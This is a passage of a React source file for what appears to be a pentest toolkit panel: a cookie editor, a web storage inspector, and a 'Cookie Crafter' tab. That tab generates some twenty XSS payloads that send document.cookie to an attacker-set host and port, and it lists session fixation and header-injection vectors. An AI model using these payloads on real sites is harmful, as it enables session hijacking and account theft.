import { useState, useMemo, useCallback, useEffect } from "react";
import {
  Cookie,
  Trash2,
  Plus,
  Pencil,
  RefreshCw,
  AlertTriangle,
  Download,
  Upload,
  Shield,
  FlaskConical,
  Link2,
} from "lucide-react";
import { Card } from "../components/ui/Card.jsx";
import { Input } from "../components/ui/Input.jsx";
import { CopyButton } from "../components/ui/CopyButton.jsx";
import { useAppStore } from "../store/app.js";

const mono = "JetBrains Mono, monospace";
const heading = "Space Grotesk, sans-serif";
const ACCENT = "#FBBF24";
const BG = "#0B0F18";
const BORDER = "1px solid rgba(255,255,255,0.06)";
const TEXT = "#E5E7EB";
const DIM = "#9CA3AF";

// ── Cookie helpers ─────────────────────────────────────────────────────────

function parseDocumentCookies() {
  if (!document.cookie) return [];
  return document.cookie.split("; ").map((part) => {
    const idx = part.indexOf("=");
    if (idx === -1) return { name: part.trim(), value: "" };
    return {
      name: part.slice(0, idx).trim(),
      value: part.slice(idx + 1),
    };
  });
}

/** Keep JWT dots intact; only escape chars that break document.cookie parsing. */
function escapeCookieSegment(s) {
  return String(s).replace(/[\x00-\x1F\x7F;\\"]/g, (ch) => {
    if (ch === ";") return "%3B";
    if (ch === "\\") return "%5C";
    if (ch === '"') return "%22";
    return "%" + ch.charCodeAt(0).toString(16).padStart(2, "0");
  });
}

function buildCookieSetString({
  name,
  value,
  domain,
  path,
  maxAge,
  secure,
  sameSite,
  expires,
}) {
  let s = `${escapeCookieSegment(name)}=${escapeCookieSegment(value)}`;
  if (path) s += `; path=${path}`;
  if (domain) s += `; domain=${domain}`;
  if (maxAge !== "" && maxAge != null && maxAge !== undefined)
    s += `; max-age=${maxAge}`;
  if (expires) s += `; expires=${expires}`;
  if (secure) s += "; secure";
  if (sameSite) s += `; samesite=${sameSite}`;
  return s;
}

function deleteCookieByName(name, path = "/", domain = "") {
  let s = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=${path || "/"}`;
  if (domain) s += `; domain=${domain}`;
  document.cookie = s;
}

// ── Storage helpers ─────────────────────────────────────────────────────────

function byteLength(str) {
  return new Blob([str]).size;
}

function detectStorageType(raw) {
  const t = raw.trim();
  if (t === "") return { kind: "string", label: "string" };
  if (/^-?\d+(\.\d+)?([eE][+-]?\d+)?$/.test(t) && !Number.isNaN(Number(t)))
    return { kind: "number", label: "number" };
  if ((t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"))) {
    try {
      const v = JSON.parse(t);
      if (v === null) return { kind: "json-null", label: "JSON null" };
      if (Array.isArray(v)) return { kind: "json-array", label: "JSON array" };
      if (typeof v === "object") return { kind: "json-object", label: "JSON object" };
    } catch {
      /* fallthrough */
    }
  }
  return { kind: "string", label: "string" };
}

function syntaxHighlightJson(json) {
  const str =
    typeof json === "string" ? json : JSON.stringify(json, null, 2);
  return str.split(/(\s+)/).map((chunk, i) => {
    if (/^\s+$/.test(chunk)) return <span key={i}>{chunk}</span>;
    return chunk.split(/("[^"]*":)|("[^"]*")|(\b\d+\.?\d*\b)|(true|false|null)/g).map((seg, j) => {
      if (!seg) return null;
      if (seg.endsWith('":'))
        return (
          <span key={`${i}-${j}`} style={{ color: "#7DD3FC" }}>
            {seg}
          </span>
        );
      if (seg.startsWith('"') && seg.endsWith('"'))
        return (
          <span key={`${i}-${j}`} style={{ color: "#6EE7B7" }}>
            {seg}
          </span>
        );
      if (/^\d/.test(seg))
        return (
          <span key={`${i}-${j}`} style={{ color: ACCENT }}>
            {seg}
          </span>
        );
      if (seg === "true" || seg === "false" || seg === "null")
        return (
          <span key={`${i}-${j}`} style={{ color: "#FB7185" }}>
            {seg}
          </span>
        );
      return <span key={`${i}-${j}`}>{seg}</span>;
    });
  });
}

const TRUNC = 56;

function TruncatedValue({ text, expanded, onToggle, monoFont = true }) {
  const needs = text.length > TRUNC;
  const shown = expanded || !needs ? text : `${text.slice(0, TRUNC)}…`;
  return (
    <button
      type="button"
      onClick={() => needs && onToggle()}
      style={{
        fontFamily: monoFont ? mono : "inherit",
        fontSize: 11,
        textAlign: "left",
        background: "rgba(255,255,255,0.03)",
        border: BORDER,
        borderRadius: 6,
        padding: "6px 8px",
        color: TEXT,
        cursor: needs ? "pointer" : "default",
        width: "100%",
        wordBreak: "break-all",
      }}
    >
      {shown}
    </button>
  );
}

const btnBase = {
  fontFamily: mono,
  fontSize: 10,
  fontWeight: 600,
  padding: "6px 10px",
  borderRadius: 6,
  border: BORDER,
  cursor: "pointer",
  display: "inline-flex",
  alignItems: "center",
  gap: 4,
};

const secondaryBtn = {
  ...btnBase,
  background: "rgba(255,255,255,0.06)",
  color: TEXT,
};

const dangerBtn = {
  ...btnBase,
  background: "rgba(251,113,133,0.12)",
  color: "#FCA5A5",
  border: "1px solid rgba(251,113,133,0.25)",
};

const accentBtn = {
  ...btnBase,
  background: `${ACCENT}22`,
  color: ACCENT,
  border: `1px solid ${ACCENT}44`,
};

function TabButton({ active, children, onClick }) {
  return (
    <button
      type="button"
      onClick={onClick}
      style={{
        fontFamily: heading,
        fontSize: 12,
        fontWeight: 600,
        padding: "8px 14px",
        borderRadius: 8,
        border: active ? `1px solid ${ACCENT}66` : BORDER,
        background: active ? `${ACCENT}18` : "rgba(255,255,255,0.04)",
        color: active ? ACCENT : DIM,
        cursor: "pointer",
        transition: "background 0.15s, color 0.15s",
      }}
    >
      {children}
    </button>
  );
}

// ── Tab 1: Cookie Editor ─────────────────────────────────────────────────────

function CookieEditorTab() {
  const [cookies, setCookies] = useState(() => parseDocumentCookies());
  const [filter, setFilter] = useState("");
  const [expanded, setExpanded] = useState({});
  const [editing, setEditing] = useState(null);
  const [form, setForm] = useState({
    name: "",
    value: "",
    domain: "",
    path: "/",
    maxAge: "",
    secure: false,
    sameSite: "Lax",
  });
  const [editDraft, setEditDraft] = useState({});

  const refresh = useCallback(() => {
    setCookies(parseDocumentCookies());
  }, []);

  useEffect(() => {
    refresh();
  }, [refresh]);

  const filtered = useMemo(() => {
    const q = filter.trim().toLowerCase();
    if (!q) return cookies;
    return cookies.filter(
      (c) =>
        c.name.toLowerCase().includes(q) ||
        c.value.toLowerCase().includes(q),
    );
  }, [cookies, filter]);

  const addCookie = () => {
    if (!form.name.trim()) return;
    document.cookie = buildCookieSetString({
      ...form,
      name: form.name.trim(),
      value: form.value,
      sameSite: form.sameSite || "Lax",
    });
    refresh();
    setForm({
      name: "",
      value: "",
      domain: "",
      path: "/",
      maxAge: "",
      secure: false,
      sameSite: "Lax",
    });
  };

  const startEdit = (c) => {
    setEditing(c.name);
    setEditDraft({
      name: c.name,
      value: c.value,
      domain: "",
      path: "/",
      maxAge: "",
      secure: false,
      sameSite: "Lax",
    });
  };

  const saveEdit = () => {
    if (!editing) return;
    deleteCookieByName(editing, editDraft.path || "/", editDraft.domain);
    document.cookie = buildCookieSetString({
      ...editDraft,
      name: editDraft.name.trim(),
      sameSite: editDraft.sameSite || "Lax",
    });
    setEditing(null);
    refresh();
  };

  const removeOne = (c) => {
    deleteCookieByName(c.name, "/", "");
    refresh();
  };

  const removeAll = () => {
    cookies.forEach((c) => deleteCookieByName(c.name, "/", ""));
    refresh();
  };

  const copyAllJson = JSON.stringify(
    Object.fromEntries(cookies.map((c) => [c.name, c.value])),
    null,
    2,
  );

  const na = "—";

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <div
        style={{
          display: "flex",
          alignItems: "flex-start",
          gap: 10,
          padding: "12px 14px",
          background: `${ACCENT}12`,
          border: `1px solid ${ACCENT}33`,
          borderRadius: 10,
          fontFamily: mono,
          fontSize: 11,
          color: "#FDE68A",
        }}
      >
        <AlertTriangle size={18} style={{ flexShrink: 0, marginTop: 2 }} />
        <div>
          <strong style={{ color: ACCENT }}>HttpOnly &amp; metadata</strong>
          <p style={{ margin: "6px 0 0", lineHeight: 1.5, color: DIM }}>
            <code style={{ color: TEXT }}>document.cookie</code> only exposes
            non-HttpOnly cookies as <code style={{ color: TEXT }}>name=value</code> pairs.
            Domain, path, expiry, Secure, SameSite, and HttpOnly are{" "}
            <strong style={{ color: TEXT }}>not readable</strong> from JavaScript.
            HttpOnly cookies never appear here. Use DevTools → Application for the full picture.
          </p>
        </div>
      </div>

      <div style={{ display: "flex", flexWrap: "wrap", gap: 10, alignItems: "flex-end" }}>
        <div style={{ flex: "1 1 220px" }}>
          <Input
            label="Search"
            placeholder="Filter by name or value…"
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            style={{ width: "100%" }}
          />
        </div>
        <button type="button" onClick={refresh} style={secondaryBtn}>
          <RefreshCw size={14} /> Refresh
        </button>
        <CopyButton text={copyAllJson} />
        <span style={{ fontFamily: mono, fontSize: 10, color: DIM, alignSelf: "center" }}>
          Copy all (JSON)
        </span>
        <button type="button" onClick={removeAll} style={dangerBtn}>
          <Trash2 size={14} /> Delete all
        </button>
      </div>

      <Card style={{ background: BG, border: BORDER, overflow: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontFamily: mono, fontSize: 11 }}>
          <thead>
            <tr style={{ color: DIM, textAlign: "left" }}>
              {["Name", "Value", "Domain", "Path", "Expiry", "Secure", "HttpOnly", "SameSite", ""].map(
                (h) => (
                  <th key={h} style={{ padding: "8px 10px", borderBottom: BORDER, fontWeight: 600 }}>
                    {h}
                  </th>
                ),
              )}
            </tr>
          </thead>
          <tbody>
            {filtered.map((c) => (
              <tr key={c.name} style={{ color: TEXT }}>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <input
                      value={editDraft.name}
                      onChange={(e) => setEditDraft({ ...editDraft, name: e.target.value })}
                      style={{
                        width: "100%",
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                      }}
                    />
                  ) : (
                    c.name
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, maxWidth: 280, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <textarea
                      value={editDraft.value}
                      onChange={(e) => setEditDraft({ ...editDraft, value: e.target.value })}
                      rows={3}
                      style={{
                        width: "100%",
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                        resize: "vertical",
                      }}
                    />
                  ) : (
                    <TruncatedValue
                      text={c.value}
                      expanded={expanded[`v-${c.name}`]}
                      onToggle={() =>
                        setExpanded((s) => ({ ...s, [`v-${c.name}`]: !s[`v-${c.name}`] }))
                      }
                    />
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: DIM, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <input
                      placeholder="optional"
                      value={editDraft.domain}
                      onChange={(e) => setEditDraft({ ...editDraft, domain: e.target.value })}
                      style={{
                        width: 120,
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                      }}
                    />
                  ) : (
                    na
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: DIM, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <input
                      value={editDraft.path}
                      onChange={(e) => setEditDraft({ ...editDraft, path: e.target.value })}
                      style={{
                        width: 72,
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                      }}
                    />
                  ) : (
                    na
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: DIM, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <input
                      placeholder="max-age sec"
                      value={editDraft.maxAge}
                      onChange={(e) => setEditDraft({ ...editDraft, maxAge: e.target.value })}
                      style={{
                        width: 100,
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                      }}
                    />
                  ) : (
                    na
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: DIM, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <label style={{ display: "flex", alignItems: "center", gap: 6, cursor: "pointer" }}>
                      <input
                        type="checkbox"
                        checked={editDraft.secure}
                        onChange={(e) => setEditDraft({ ...editDraft, secure: e.target.checked })}
                      />
                      <span>Secure</span>
                    </label>
                  ) : (
                    na
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: "#6EE7B7", verticalAlign: "top" }}>
                  No <span style={{ color: DIM, fontSize: 9 }}>(visible to JS)</span>
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, color: DIM, verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <select
                      value={editDraft.sameSite}
                      onChange={(e) => setEditDraft({ ...editDraft, sameSite: e.target.value })}
                      style={{
                        fontFamily: mono,
                        fontSize: 11,
                        padding: 6,
                        background: "#111827",
                        border: BORDER,
                        borderRadius: 6,
                        color: TEXT,
                      }}
                    >
                      <option value="Lax">Lax</option>
                      <option value="Strict">Strict</option>
                      <option value="None">None</option>
                    </select>
                  ) : (
                    na
                  )}
                </td>
                <td style={{ padding: "8px 10px", borderBottom: BORDER, whiteSpace: "nowrap", verticalAlign: "top" }}>
                  {editing === c.name ? (
                    <>
                      <button type="button" onClick={saveEdit} style={{ ...accentBtn, marginRight: 6 }}>
                        Save
                      </button>
                      <button type="button" onClick={() => setEditing(null)} style={secondaryBtn}>
                        Cancel
                      </button>
                    </>
                  ) : (
                    <>
                      <button type="button" onClick={() => startEdit(c)} style={{ ...secondaryBtn, marginRight: 6 }}>
                        <Pencil size={12} /> Edit
                      </button>
                      <button type="button" onClick={() => removeOne(c)} style={dangerBtn}>
                        <Trash2 size={12} />
                      </button>
                    </>
                  )}
                </td>
              </tr>
            ))}
            {filtered.length === 0 && (
              <tr>
                <td colSpan={9} style={{ padding: 24, textAlign: "center", color: DIM, fontFamily: mono }}>
                  No cookies match this filter.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </Card>

      <Card style={{ background: BG, border: BORDER }}>
        <h4 style={{ fontFamily: heading, fontSize: 13, color: ACCENT, margin: "0 0 12px" }}>
          Add cookie
        </h4>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fill, minmax(160px, 1fr))",
            gap: 12,
            alignItems: "end",
          }}
        >
          <Input label="Name" value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} />
          <Input label="Value" value={form.value} onChange={(e) => setForm({ ...form, value: e.target.value })} />
          <Input
            label="Domain (optional)"
            value={form.domain}
            onChange={(e) => setForm({ ...form, domain: e.target.value })}
          />
          <Input label="Path" value={form.path} onChange={(e) => setForm({ ...form, path: e.target.value })} />
          <Input
            label="Max-Age (sec)"
            type="number"
            value={form.maxAge}
            onChange={(e) => setForm({ ...form, maxAge: e.target.value })}
          />
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            <span style={{ fontFamily: mono, fontSize: 10, fontWeight: 600, color: DIM, textTransform: "uppercase" }}>
              SameSite
            </span>
            <select
              value={form.sameSite}
              onChange={(e) => setForm({ ...form, sameSite: e.target.value })}
              style={{
                fontFamily: mono,
                fontSize: 12,
                padding: "10px 12px",
                background: "#111827",
                border: BORDER,
                borderRadius: 8,
                color: TEXT,
              }}
            >
              <option value="Lax">Lax</option>
              <option value="Strict">Strict</option>
              <option value="None">None</option>
            </select>
          </div>
          <label
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              fontFamily: mono,
              fontSize: 11,
              color: TEXT,
              cursor: "pointer",
            }}
          >
            <input
              type="checkbox"
              checked={form.secure}
              onChange={(e) => setForm({ ...form, secure: e.target.checked })}
            />
            Secure
          </label>
          <button type="button" onClick={addCookie} style={{ ...accentBtn, height: 40 }}>
            <Plus size={16} /> Add cookie
          </button>
        </div>
      </Card>
    </div>
  );
}

// ── Tab 2 & 3: Storage inspector ─────────────────────────────────────────────

function StorageInspectorTab({ storage, title }) {
  const [entries, setEntries] = useState([]);
  const [filter, setFilter] = useState("");
  const [expanded, setExpanded] = useState({});
  const [addKey, setAddKey] = useState("");
  const [addVal, setAddVal] = useState("");
  const [editingKey, setEditingKey] = useState(null);
  const [editVal, setEditVal] = useState("");
  const fileInputId = `import-${storage === window.localStorage ? "ls" : "ss"}`;

  const readAll = useCallback(() => {
    const list = [];
    for (let i = 0; i < storage.length; i++) {
      const key = storage.key(i);
      if (key == null) continue;
      const value = storage.getItem(key) ?? "";
      list.push({ key, value });
    }
    list.sort((a, b) => a.key.localeCompare(b.key));
    setEntries(list);
  }, [storage]);

  useEffect(() => {
    readAll();
  }, [readAll]);

  const filtered = useMemo(() => {
    const q = filter.trim().toLowerCase();
    if (!q) return entries;
    return entries.filter(
      (e) => e.key.toLowerCase().includes(q) || e.value.toLowerCase().includes(q),
    );
  }, [entries, filter]);

  const totalBytes = useMemo(
    () => entries.reduce((acc, e) => acc + byteLength(e.key) + byteLength(e.value), 0),
    [entries],
  );

  const addEntry = () => {
    if (!addKey.trim()) return;
    storage.setItem(addKey.trim(), addVal);
    setAddKey("");
    setAddVal("");
    readAll();
  };

  const startEdit = (e) => {
    setEditingKey(e.key);
    setEditVal(e.value);
  };

  const saveEdit = () => {
    if (editingKey == null) return;
    storage.setItem(editingKey, editVal);
    setEditingKey(null);
    readAll();
  };

  const removeOne = (key) => {
    storage.removeItem(key);
    readAll();
  };

  const clearAll = () => {
    storage.clear();
    readAll();
  };

  const exportJson = JSON.stringify(
    Object.fromEntries(entries.map((e) => [e.key, e.value])),
    null,
    2,
  );

  const onImportFile = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const obj = JSON.parse(String(reader.result));
        if (obj && typeof obj === "object" && !Array.isArray(obj)) {
          Object.entries(obj).forEach(([k, v]) => {
            storage.setItem(k, typeof v === "string" ? v : JSON.stringify(v));
          });
          readAll();
        }
      } catch {
        /* ignore */
      }
    };
    reader.readAsText(file);
    e.target.value = "";
  };

  const pasteImport = () => {
    const raw = window.prompt("Paste JSON object { \"key\": \"value\" }");
    if (!raw) return;
    try {
      const obj = JSON.parse(raw);
      if (obj && typeof obj === "object" && !Array.isArray(obj)) {
        Object.entries(obj).forEach(([k, v]) => {
          storage.setItem(k, typeof v === "string" ? v : JSON.stringify(v));
        });
        readAll();
      }
    } catch {
      /* ignore */
    }
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <p style={{ margin: 0, fontFamily: mono, fontSize: 11, color: DIM }}>
        {title} — origin: <code style={{ color: ACCENT }}>{window.location.origin}</code>
      </p>

      <div style={{ display: "flex", flexWrap: "wrap", gap: 10, alignItems: "flex-end" }}>
        <div style={{ flex: "1 1 200px" }}>
          <Input
            label="Search"
            placeholder="Filter keys or values…"
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
          />
        </div>
        <button type="button" onClick={readAll} style={secondaryBtn}>
          <RefreshCw size={14} /> Refresh
        </button>
        <CopyButton text={exportJson} />
        <span style={{ fontFamily: mono, fontSize: 10, color: DIM }}>Copy export</span>
        <button type="button" onClick={pasteImport} style={secondaryBtn}>
          <Upload size={14} /> Import (paste)
        </button>
        <label htmlFor={fileInputId} style={{ ...secondaryBtn, cursor: "pointer" }}>
          <Download size={14} />
          Import file
          <input
            id={fileInputId}
            type="file"
            accept="application/json,.json"
            style={{ display: "none" }}
            onChange={onImportFile}
          />
        </label>
        <button type="button" onClick={clearAll} style={dangerBtn}>
          <Trash2 size={14} /> Clear all
        </button>
      </div>

      <Card style={{ background: BG, border: BORDER, overflow: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontFamily: mono, fontSize: 11 }}>
          <thead>
            <tr style={{ color: DIM, textAlign: "left" }}>
              {["Key", "Value", "Size", "Type", ""].map((h) => (
                <th key={h} style={{ padding: "8px 10px", borderBottom: BORDER, fontWeight: 600 }}>
                  {h}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {filtered.map((e) => {
              const dt = detectStorageType(e.value);
              let pretty = null;
              if (dt.kind === "json-object" || dt.kind === "json-array") {
                try {
                  pretty = JSON.parse(e.value);
                } catch {
                  pretty = null;
                }
              }
              const size = byteLength(e.key) + byteLength(e.value);
              const isEdit = editingKey === e.key;

              return (
                <tr key={e.key} style={{ color: TEXT, verticalAlign: "top" }}>
                  <td style={{ padding: "8px 10px", borderBottom: BORDER, maxWidth: 160, wordBreak: "break-all" }}>
                    {e.key}
                  </td>
                  <td style={{ padding: "8px 10px", borderBottom: BORDER, minWidth: 200 }}>
                    {isEdit ? (
                      <textarea
                        value={editVal}
                        onChange={(ev) => setEditVal(ev.target.value)}
                        rows={4}
                        style={{
                          width: "100%",
                          fontFamily: mono,
                          fontSize: 11,
                          padding: 8,
                          background: "#111827",
                          border: BORDER,
                          borderRadius: 6,
                          color: TEXT,
                          resize: "vertical",
                        }}
                      />
                    ) : pretty != null ? (
                      <pre
                        style={{
                          margin: 0,
                          padding: "8px 10px",
                          background: "rgba(255,255,255,0.03)",
                          border: BORDER,
                          borderRadius: 6,
                          fontFamily: mono,
                          fontSize: 11,
                          whiteSpace: "pre-wrap",
                          wordBreak: "break-all",
                          maxHeight: expanded[`json-${e.key}`] ? "none" : 120,
                          overflow: expanded[`json-${e.key}`] ? "visible" : "auto",
                        }}
                      >
                        {syntaxHighlightJson(pretty)}
                      </pre>
                    ) : (
                      <TruncatedValue
                        text={e.value}
                        expanded={expanded[`v-${e.key}`]}
                        onToggle={() =>
                          setExpanded((s) => ({ ...s, [`v-${e.key}`]: !s[`v-${e.key}`] }))
                        }
                      />
                    )}
                    {pretty != null && !isEdit && (
                      <button
                        type="button"
                        onClick={() =>
                          setExpanded((s) => ({ ...s, [`json-${e.key}`]: !s[`json-${e.key}`] }))
                        }
                        style={{ ...secondaryBtn, marginTop: 6, fontSize: 9 }}
                      >
                        {expanded[`json-${e.key}`] ? "Collapse height" : "Expand height"}
                      </button>
                    )}
                  </td>
                  <td style={{ padding: "8px 10px", borderBottom: BORDER, color: ACCENT }}>{size} B</td>
                  <td style={{ padding: "8px 10px", borderBottom: BORDER, color: "#7DD3FC" }}>{dt.label}</td>
                  <td style={{ padding: "8px 10px", borderBottom: BORDER, whiteSpace: "nowrap" }}>
                    {isEdit ? (
                      <>
                        <button type="button" onClick={saveEdit} style={{ ...accentBtn, marginRight: 6 }}>
                          Save
                        </button>
                        <button
                          type="button"
                          onClick={() => setEditingKey(null)}
                          style={secondaryBtn}
                        >
                          Cancel
                        </button>
                      </>
                    ) : (
                      <>
                        <button
                          type="button"
                          onClick={() => startEdit(e)}
                          style={{ ...secondaryBtn, marginRight: 6 }}
                        >
                          <Pencil size={12} /> Edit
                        </button>
                        <button type="button" onClick={() => removeOne(e.key)} style={dangerBtn}>
                          <Trash2 size={12} />
                        </button>
                      </>
                    )}
                  </td>
                </tr>
              );
            })}
            {filtered.length === 0 && (
              <tr>
                <td colSpan={5} style={{ padding: 24, textAlign: "center", color: DIM }}>
                  No entries.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </Card>

      <Card style={{ background: BG, border: BORDER }}>
        <h4 style={{ fontFamily: heading, fontSize: 13, color: ACCENT, margin: "0 0 12px" }}>
          Add entry
        </h4>
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Input label="Key" value={addKey} onChange={(e) => setAddKey(e.target.value)} />
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            <span style={{ fontFamily: mono, fontSize: 10, fontWeight: 600, color: DIM, textTransform: "uppercase" }}>
              Value
            </span>
            <textarea
              value={addVal}
              onChange={(e) => setAddVal(e.target.value)}
              rows={4}
              placeholder="String or JSON…"
              style={{
                fontFamily: mono,
                fontSize: 12,
                padding: "10px 12px",
                background: "#111827",
                border: BORDER,
                borderRadius: 8,
                color: TEXT,
                resize: "vertical",
              }}
            />
          </div>
          <button type="button" onClick={addEntry} style={{ ...accentBtn, alignSelf: "flex-start" }}>
            <Plus size={16} /> Add entry
          </button>
        </div>
      </Card>

      <div
        style={{
          fontFamily: mono,
          fontSize: 12,
          color: DIM,
          textAlign: "right",
          padding: "8px 4px",
        }}
      >
        Total size: <strong style={{ color: ACCENT }}>{totalBytes}</strong> bytes ({entries.length} keys)
      </div>
    </div>
  );
}

// ── Tab 4: Cookie Crafter ───────────────────────────────────────────────────

function buildStealerPayloads(lhost, lport) {
  const base = `http://${lhost}:${lport}`;
  const u = `${base}/?c=`;
  const c = "document.cookie";
  const ec = "encodeURIComponent(document.cookie)";
  return [
    { name: "Image().src (classic)", payload: `<script>new Image().src="${u}"+${ec}</script>` },
    { name: "fetch GET", payload: `<script>fetch("${u}"+${ec})</script>` },
    { name: "img onerror + fetch", payload: `<img src=x onerror="fetch('${u}'+encodeURIComponent(document.cookie))">` },
    { name: "XMLHttpRequest", payload: `<script>var x=new XMLHttpRequest();x.open("GET","${u}"+${ec});x.send()</script>` },
    { name: "sendBeacon (URL)", payload: `<script>navigator.sendBeacon("${u}"+${ec})</script>` },
    { name: "Image raw cookie (no encode)", payload: `<script>new Image().src="${u}"+${c}</script>` },
    { name: "location.assign", payload: `<script>location.assign("${u}"+${ec})</script>` },
    { name: "window.open", payload: `<script>window.open("${u}"+${ec})</script>` },
    { name: "WebSocket send", payload: `<script>var w=new WebSocket("ws://${lhost}:${lport}/");w.onopen=function(){w.send(${c})}</script>` },
    { name: "EventSource query (edge)", payload: `<script>new EventSource("${u}"+${ec}).close()</script>` },
    { name: "SVG onload", payload: `<svg/onload="fetch('${u}'+encodeURIComponent(document.cookie))">` },
    { name: "Body onload", payload: `<body onload="new Image().src='${u}'+encodeURIComponent(document.cookie)">` },
    { name: "Input onfocus autofocus", payload: `<input onfocus="fetch('${u}'+encodeURIComponent(document.cookie))" autofocus>` },
    { name: "Marquee onstart", payload: `<marquee onstart="fetch('${u}'+encodeURIComponent(document.cookie))">` },
    { name: "Audio onerror", payload: `<audio src=x onerror="fetch('${u}'+encodeURIComponent(document.cookie))">` },
    { name: "Video onerror", payload: `<video src=x onerror="new Image().src='${u}'+encodeURIComponent(document.cookie)">` },
    { name: "Details ontoggle", payload: `<details open ontoggle="fetch('${u}'+encodeURIComponent(document.cookie))">` },
    { name: "fetch POST body", payload: `<script>fetch("${base}/",{method:"POST",body:${ec},headers:{"Content-Type":"text/plain"}})</script>` },
    { name: "iframe srcdoc script", payload: `<iframe srcdoc="<script>parent.fetch('${u}'+encodeURIComponent(parent.document.cookie))</script>"></iframe>` },
    { name: "jQuery.get (if $)", payload: `<script>$.get("${u}"+${ec})</script>` },
  ];
}

function CookieCrafterTab() {
  const lhost = useAppStore((s) => s.lhost);
  const lport = useAppStore((s) => s.lport);

  const [jwtToken, setJwtToken] = useState("");
  const [jwtName, setJwtName] = useState("session");
  const [jwtPath, setJwtPath] = useState("/");
  const [jwtSecure, setJwtSecure] = useState(false);
  const [jwtSame, setJwtSame] = useState("Lax");

  const applyJwtCookie = () => {
    if (!jwtToken.trim()) return;
    document.cookie = buildCookieSetString({
      name: jwtName.trim() || "session",
      value: jwtToken.trim(),
      path: jwtPath || "/",
      domain: "",
      maxAge: "",
      secure: jwtSecure,
      sameSite: jwtSame,
    });
  };

  const stealers = useMemo(() => buildStealerPayloads(lhost, lport), [lhost, lport]);

  const [flagPath, setFlagPath] = useState("/");
  const [flagResults, setFlagResults] = useState([]);

  const runFlagTests = () => {
    const name = `__slime_flag_${Date.now()}`;
    const tests = [
      { label: "Minimal", opts: { secure: false, sameSite: "Lax" } },
      { label: "Secure", opts: { secure: true, sameSite: "Lax" } },
      { label: "SameSite=Strict", opts: { secure: false, sameSite: "Strict" } },
      { label: "SameSite=None + Secure", opts: { secure: true, sameSite: "None" } },
      {
        label: "Alternate path",
        opts: { secure: false, sameSite: "Lax", path: "/slime-cookie-test/" },
      },
    ];
    const out = [];
    tests.forEach((t, i) => {
      const n = `${name}_${i}`;
      const built = buildCookieSetString({
        name: n,
        value: "1",
        path: t.opts.path ?? flagPath ?? "/",
        domain: "",
        maxAge: "120",
        secure: t.opts.secure,
        sameSite: t.opts.sameSite,
      });
      document.cookie = built;
      const present = document.cookie.includes(`${n}=`);
      out.push({
        label: t.label,
        built,
        present,
        note: !present
          ? "Not visible on current path/host (expected for some path/domain combos) or stripped by browser"
          : "Name=value visible in document.cookie (Secure/HttpOnly/SameSite not readable from JS)",
      });
    });
    setFlagResults(out);
  };

  const fixationVectors = useMemo(
    () => [
      {
        title: "URL query — generic",
        body: `${window.location.origin}/app?sessionid=ATTACKER_KNOWN_ID`,
      },
      {
        title: "PHPSESSID in link",
        body: `<a href="https://victim.example/login.php?PHPSESSID=attacker_session">Click</a>`,
      },
      {
        title: "JSESSIONID path",
        body: `https://victim.example/app;jsessionid=ATTACKER_SESSION`,
      },
      {
        title: "ASP.NET_SessionId form",
        body: `<form action="/login" method="POST"><input name="ASP.NET_SessionId" value="attacker"/></form>`,
      },
      {
        title: "Meta refresh",
        body: `<meta http-equiv="refresh" content="0;url=https://victim.example/?sid=attacker">`,
      },
      {
        title: "Set-Cookie injection (response split — legacy)",
        body: `session=good; Path=/\\r\\nSet-Cookie: session=attacker; Path=/`,
      },
      {
        title: "JSON body session key",
        body: `POST /api/session { "sessionId": "attacker-controlled" }`,
      },
      {
        title: "Authorization bearer fixation",
        body: `Share link with ?token=attacker_jwt so victim stores attacker's token`,
      },
    ],
    [],
  );

  const sectionTitle = {
    fontFamily: heading,
    fontSize: 14,
    color: ACCENT,
    margin: "0 0 10px",
    display: "flex",
    alignItems: "center",
    gap: 8,
  };

  return (
